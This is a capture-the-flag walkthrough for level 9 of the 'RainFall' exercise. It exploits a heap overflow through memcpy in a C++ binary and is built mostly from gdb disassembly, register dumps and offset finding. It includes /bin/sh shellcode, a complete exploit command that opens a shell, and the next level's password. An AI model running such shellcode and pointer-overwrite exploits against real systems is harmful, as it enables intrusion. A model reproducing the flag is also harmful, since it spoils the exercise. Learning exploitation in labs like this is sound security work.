using gdb:
we notice that this level is not c but c++

cheking the functions used:
----------------------------------------
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
(gdb)
----------------------------------------

there is some functions we need to check now are N::N(int), N::setAnnotation(char*), N::operator+(N&), N::operator-(N&)
and the memcpy

checking N::setAnnotation(char*):
----------------------------------------
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:		push   ebp
   0x0804870f <+1>:		mov    ebp,esp
   0x08048711 <+3>:		sub    esp,0x18
   0x08048714 <+6>:		mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:		mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:	add    edx,0x4
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.
----------------------------------------

we notice that's where the memcpy is used .. and we know that that's an overflow

firstly we need to get the padding to make the program segfault
after some tries we get the offset using:
----------------------------------------
(gdb) run $(python -c "print 'A'*109")
Starting program: /home/user/level9/level9 $(python -c "print 'A'*109")

Program received signal SIGSEGV, Segmentation fault.
0x54000000 in ?? ()
(gdb)
----------------------------------------

so the offset is 108

we notice that the program has no system call or printing any pass code so we need
eventually to inject a shell code

let's get a shell code someone already made, i got one at this: http://shell-storm.org/shellcode/files/shellcode-811.php
and the shell code is : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

now to inject this sjell code we must find the address that the overflow starts with
and to do that we need to make a break after the function that overflows which is N::setAnnotation(char*):

----------------------------------------
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) disas main
Dump of assembler code for function main:
0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:		mov    ebp,esp
   0x080485f7 <+3>:		push   ebx
	.
	.
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
=> 0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
    .
	.
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret
End of assembler dump.
----------------------------------------

now let's run the brogram:
----------------------------------------
(gdb) run AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level9/level9 AAAA

Breakpoint 1, 0x0804867c in main ()
(gdb) info registers
eax            0x804a00c	134520844
ecx            0x41414141	1094795585
edx            0x804a010	134520848
ebx            0x804a078	134520952
esp            0xbffff6e0	0xbffff6e0
ebp            0xbffff708	0xbffff708
esi            0x0	0
edi            0x0	0
eip            0x804867c	0x804867c <main+136>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
----------------------------------------

so as we can the see eax register has the address 0x804a00c
----------------------------------------
(gdb) x $eax
0x804a00c:	0x41414141
(gdb)
----------------------------------------

so now we are sure that the starting address is 0x804a00c
 
we gonna replace the value where we break which is esp+10:
----------------------------------------
=> 0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
----------------------------------------

and give it the address of staart overflow that will leads to the shell

it will be: address_to_get_toshell + shell_code + garbage[76] + start_overflow_address = 112 (108 + 4 of the start overflow address)
-> address_to_get_toshell = 0x804a00c + 4 ( 0x804a010)
-> shell_code = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
-> garbage = 'A' * 76
-> start_overflow_address = 0x804a00c

and with a python script:
 
--[ print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' * 76 + '\x0c\xa0\x04\x08' ]--

the finale answer is:
level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' *76 + '\x0c\xa0\x04\x08'"`
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
